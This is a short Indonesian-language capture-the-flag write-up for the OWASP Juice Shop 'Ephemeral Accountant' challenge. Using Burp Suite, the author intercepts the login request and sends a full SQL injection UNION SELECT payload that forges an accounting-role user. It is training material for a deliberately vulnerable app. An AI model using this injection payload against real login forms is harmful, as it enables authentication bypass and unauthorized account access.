# Ephemeral Accountant

Link: https://juice-shop.herokuapp.com/#/score-board?categories=Injection&showDisabledChallenges=false

![alt text](<img/Screenshot 2025-09-10 221513.png>)

1. Masuk ke halaman login

2. Mengaktifkan intercept pada burpsuite kemudian input username dan password

![alt text](<img/Screenshot 2025-09-10 201040.png>)

3. Pilih paket request **POST** pada burpsuite yang berisi username dan password. Kemudian send to repeater.

![alt text](<img/Screenshot 2025-09-10 201102.png>)

4. Berdasarkan soal `Database Schema`, format yang ditemukan pada tabel users adalah sebagai berikut

![alt text](<img/Screenshot 2025-09-10 195949.png>)

5. Mengganti payload berikut pada paket yang dikirim ke repeater sesuai dengan format. Kemudian send.

```
' UNION SELECT * FROM (SELECT 1000 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email','asdfasdf' as 'password', 'accounting' as 'role','' as 'deluxeToken','127.0.0.1' as 'lastLoginIp','default.svg' as 'profileImage','' as 'totpSecret',1 as 'isActive', '2025-09-09 10:12:13.423 +00:00' as 'createdAt', '2025-09-09 10:12:13.423 +00:00' as 'updatedAt', null as 'deletedAt')--
```

![alt text](<img/Screenshot 2025-09-10 205942.png>)

6. Soal berhasil diselesaikan

![alt text](<img/Screenshot 2025-09-10 221423.png>)